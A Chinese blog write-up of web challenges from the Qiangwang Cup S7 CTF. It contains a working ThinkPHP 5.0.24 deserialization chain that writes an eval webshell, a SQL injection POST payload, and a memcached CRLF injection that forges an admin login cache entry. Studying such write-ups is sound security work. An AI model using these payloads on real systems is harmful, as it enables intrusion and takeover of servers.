@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html><head lang="en">
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>强网杯s7部分题解 - xlccccc&#39;s blog</title><link rel="icon" type="image/png" href=/img/logo.jpg /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="强网杯S7，主要记录和复现下比赛时看过的web题" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="强网杯s7部分题解" />
+<meta property="og:description" content="强网杯S7，主要记录和复现下比赛时看过的web题" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.xlccccc.top/posts/%E5%BC%BA%E7%BD%91%E6%9D%AFs7%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-20T12:28:18+08:00" />
+<meta property="article:modified_time" content="2023-12-20T12:28:18+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="强网杯s7部分题解"/>
+<meta name="twitter:description" content="强网杯S7，主要记录和复现下比赛时看过的web题"/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://blog.xlccccc.top/css/main.4c58ba3f18cfa5d36cd339b82d5e62d8805118eaa92db1ce302a0f8a114a664d.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://blog.xlccccc.top/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://blog.xlccccc.top/">xlccccc&#39;s blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">Archives</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://blog.xlccccc.top/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">强网杯s7部分题解</h1>
+			<div class="meta">Posted on Dec 20, 2023</div>
+		</div>
+		<div class = "toc-wrapper">
+			
+<div class="post-toc" id="post-toc">
+<aside>
+    <header>
+    <h1>强网杯s7部分题解</h1>
+    </header>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#thinkshop">thinkshop</a></li>
+    <li><a href="#thinkshopping">thinkshopping</a>
+      <ul>
+        <li><a href="#memcached-crlf">memcached crlf</a></li>
+      </ul>
+    </li>
+    <li><a href="#html">html</a></li>
+    <li><a href="#html_again">html_again</a></li>
+  </ul>
+</nav>
+</aside>
+<a href="#" id="toc-toggle"></a>
+</div>
+
+
+
+			</div>
+		
+
+		<section class="body">
+			<h1 id="thinkshop">thinkshop</h1>
+<p>主要就是php的代码审计</p>
+<p>因为给的是容器导出的文件，所以一上来就看了下mysql的db，发现有一个<code>admin/123456</code>的用户，结果登陆不上，然后把mysql日志打开看下登陆的时候执行了什么语句</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">set</span> <span style="color:#66d9ef">GLOBAL</span> general_log<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ON&#39;</span>;
+</span></span></code></pre></div><p>发现为<code>select * from admin where id =</code></p>
+<p>所以登陆的时候输入<code>1/123456</code>即可</p>
+<p>再审一下代码会发现数据库内存的是序列化后的数据，渲染在html的时候会反序列化，结合题目所在的thinkphp，不难想到此时需要找一个sql注入更改数据库内的序列化数据</p>
+<p>而执行sql语句的地方就几个点</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled.png" alt="Untitled"></p>
+<p>这里在edit的时候没有控制key，而add的时候控制了key，那么很显然就是key这里能注入了，然后找个thinkphp5.0.24的链子套一层array生成然后注入就好了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\process\pipes</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Windows</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $files <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($files)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span> <span style="color:#f92672">=</span> [$files]; <span style="color:#75715e">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Model</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $append <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $parent;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($output, $modelRelation)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parent</span> <span style="color:#f92672">=</span> $output;  <span style="color:#75715e">//$this-&gt;parent=&gt; think\console\Output;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;xxx&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;getError&#34;</span>);     <span style="color:#75715e">//调用getError 返回this-&gt;error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> $modelRelation;               <span style="color:#75715e">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\model</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> <span style="color:#a6e22e">think\Model</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Pivot</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Model</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($output, $modelRelation)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__construct</span>($output, $modelRelation);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\model\relation</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">HasOne</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">OneToOne</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\model\relation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OneToOne</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $selfRelation;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $bindAttr <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $query;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($query)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">selfRelation</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> $query;    <span style="color:#75715e">//$query指向Query
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bindAttr</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;xxx&#39;</span>];<span style="color:#75715e">// $value值，作为call函数引用的第二变量
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\db</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Query</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $model;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($model)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span> <span style="color:#f92672">=</span> $model; <span style="color:#75715e">//$this-&gt;model=&gt; think\console\Output;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\console</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Output</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $handle;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $styles;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($handle)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">styles</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;getAttr&#39;</span>];
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handle</span> <span style="color:#f92672">=</span>$handle; <span style="color:#75715e">//$handle-&gt;think\session\driver\Memcached
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\session\driver</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Memcached</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $handler;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($handle)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> $handle; <span style="color:#75715e">//$handle-&gt;think\cache\driver\File
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">think\cache\driver</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $options<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $tag;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct(){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span><span style="color:#f92672">=</span>[
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;expire&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">3600</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;cache_subdir&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;prefix&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;path&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;data_compress&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>            ];
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;xxx&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> {
+</span></span><span style="display:flex;"><span>    $Memcached <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\session\driver\Memcached</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\think\cache\driver\File</span>());
+</span></span><span style="display:flex;"><span>    $Output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\console\Output</span>($Memcached);
+</span></span><span style="display:flex;"><span>    $model <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\db\Query</span>($Output);
+</span></span><span style="display:flex;"><span>    $HasOne <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\model\relation\HasOne</span>($model);
+</span></span><span style="display:flex;"><span>    $window <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\process\pipes\Windows</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">think\model\Pivot</span>($Output,$HasOne));
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$window);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>($a));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后在<code>/public/index.php/index/admin/do_edit.html</code> <strong>POST</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#a6e22e">test</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">price</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1.00</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">on_sale_time</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0001</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#a6e22e">T01</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A01</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">image</span><span style="color:#e6db74">`%3D&#39;123&#39;,`</span><span style="color:#a6e22e">data</span><span style="color:#e6db74">`%3D&#39;YToxOntpOjE7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eHgiO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTozNjAwO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjEyMjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWFhYVBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZGpZMk1uWFNrN1B6NGcvLi4vYS5waHAiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czo2OiIAKgB0YWciO3M6MzoieHh4Ijt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fX1zOjY6InBhcmVudCI7cjoxMjt9fX19&#39;%2F%2A%2A%2Fwhere%2F%2A%2A%2F`</span><span style="color:#a6e22e">id</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">D1</span>;<span style="color:#f92672">%</span><span style="color:#ae81ff">23</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1111111</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">A</span>
+</span></span></code></pre></div><p>访问商品页面触发反序列化，便会生成<code>a.php12ac95f1498ce51d2d96a249c09c1998.php</code> 一句话</p>
+<p>文件名是固定的，可以算出来，这里本地打一遍就知道了</p>
+<h1 id="thinkshopping">thinkshopping</h1>
+<p>在上题的基础上ban了反序列化，且数据库内没有存在的账户了，sql注入还在</p>
+<p>但mysql的<code>secure_file_priv</code>为空，所以登陆即可用sql注入读flag</p>
+<p>最大的问题便是如何登陆，比赛时想到了大概率和缓存有关系，也看了好久thinkphp的源码，但是没注意到memcached（没利用过这个组件，也不知道可以crlf写缓存）</p>
+<p>由于队里就我一个人搭了容器，把源码拖下来给队友看了，所以比赛结束被狠狠骂了</p>
+<p>（这里吐槽一下，vscode的dev container搜索有问题，啥都搜不到，导致审代码的时候浪费了好多时间）</p>
+<h2 id="memcached-crlf">memcached crlf</h2>
+<p>Memcached 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%201.png" alt="Untitled"></p>
+<p>跟进一下find函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">find</span>($data <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;fetch_sql&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;cache&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 判断查询缓存
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $cache <span style="color:#f92672">=</span> $options[<span style="color:#e6db74">&#39;cache&#39;</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">true</span> <span style="color:#f92672">===</span> $cache[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_null</span>($data) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_array</span>($data)) {
+</span></span><span style="display:flex;"><span>                $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;think:&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connection</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getConfig</span>(<span style="color:#e6db74">&#39;database&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">.</span> (<span style="color:#a6e22e">is_array</span>($options[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#a6e22e">key</span>($options[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">:</span> $options[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;|&#39;</span> <span style="color:#f92672">.</span> $data;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">is_string</span>($cache[<span style="color:#e6db74">&#39;key&#39;</span>])) {
+</span></span><span style="display:flex;"><span>                $key <span style="color:#f92672">=</span> $cache[<span style="color:#e6db74">&#39;key&#39;</span>];
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">elseif</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($key)) {
+</span></span><span style="display:flex;"><span>                $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connection</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getConfig</span>(<span style="color:#e6db74">&#39;database&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">serialize</span>($options) <span style="color:#f92672">.</span> <span style="color:#a6e22e">serialize</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind</span>));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cache</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get</span>($key);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $result;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>这里缓存key的格式为<code>think:shop.admin|username</code></p>
+<p>赛时其实对username做了一些fuzz，主要是针对sql注入的，不过后面看日志发现这里是完全注不了的，输入什么都没有报错，但是如果尝试了一下%0a就会报错了（手动字典+1）然后应该也能迅速找到漏洞点了</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%202.png" alt="Untitled"></p>
+<p>对于crlf可参考</p>
+<p><a href="https://www.freebuf.com/vuls/328384.html">https://www.freebuf.com/vuls/328384.html</a></p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%203.png" alt="Untitled"></p>
+<p>只需要加一个<code>%00%0D%0A</code>后面执行memcached的命令就好了</p>
+<p>然后数据库里添加个<code>3 admin e10adc3949ba59abbe56e057f20f883e</code></p>
+<p>登陆一下看缓存</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%204.png" alt="Untitled"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stats items
+</span></span><span style="display:flex;"><span>stats cachedump <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>get think:shop.admin|<span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p>可以拿到缓存格式，是序列化数据</p>
+<p>然后构建出如下命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set think:shop.admin|<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">101</span>
+</span></span><span style="display:flex;"><span>a:3:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;i:1;s:8:<span style="color:#e6db74">&#34;username&#34;</span>;s:5:<span style="color:#e6db74">&#34;admin&#34;</span>;s:8:<span style="color:#e6db74">&#34;password&#34;</span>;s:32:<span style="color:#e6db74">&#34;e10adc3949ba59abbe56e057f20f883e&#34;</span>;<span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>username<span style="color:#f92672">=</span>123%00%0D%0Aset%20think:shop.admin%7C12%204%20100%20101%0D%0Aa:3:%7Bs:2:%22id%22;i:1;s:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:32:%22e10adc3949ba59abbe56e057f20f883e%22;%7D&amp;password<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>这里这个时间戳必须要设置一个比较小的值才行，不懂</p>
+<p>然后用<code>1/123456</code>登陆</p>
